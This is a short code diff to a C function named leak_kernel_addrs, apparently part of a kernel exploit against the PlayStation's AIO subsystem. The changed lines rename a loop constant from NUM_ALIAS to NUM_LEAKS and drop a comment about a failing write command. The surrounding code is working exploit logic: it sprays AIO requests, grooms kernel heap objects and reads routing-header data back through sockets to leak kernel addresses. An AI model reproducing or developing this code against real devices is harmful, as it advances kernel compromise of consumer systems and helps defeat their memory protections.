@@ -848,16 +848,14 @@ int32_t leak_kernel_addrs()
     fake_batch->lock_object_lock = 1;
 
     uint32_t batch_off = 0;
-    SceKernelAioSubmitId batch_ids[NUM_HANDLES * NUM_ALIAS] = {0};
-    for (uint32_t i = 0; i < NUM_HANDLES * NUM_ALIAS; i += NUM_HANDLES) {
+    SceKernelAioSubmitId batch_ids[NUM_HANDLES * NUM_LEAKS] = {0};
+    for (uint32_t i = 0; i < NUM_HANDLES * NUM_LEAKS; i += NUM_HANDLES) {
         spray_aio(
             &batch_ids[i],
             NUM_HANDLES,
             leak_reqs,
             NUM_GROOM_REQS,
             false
-            // CMD_WRITE not working? err: -2147352541 (SCE_KERNEL_ERROR_EAGAIN)
-            // SCE_KERNEL_AIO_CMD_WRITE
         );
         get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
         for (uint32_t off = 0x80; off < s2.len; off += 0x80) {
@@ -876,7 +874,7 @@ int32_t leak_kernel_addrs()
     }
     loop_break2:
 
-    for (uint32_t i = 0; i < NUM_HANDLES * NUM_ALIAS; i += NUM_HANDLES)
+    for (uint32_t i = 0; i < NUM_HANDLES * NUM_LEAKS; i += NUM_HANDLES)
         if (batch_ids[i] != 0)
             free_aios(&batch_ids[i], NUM_HANDLES);
 
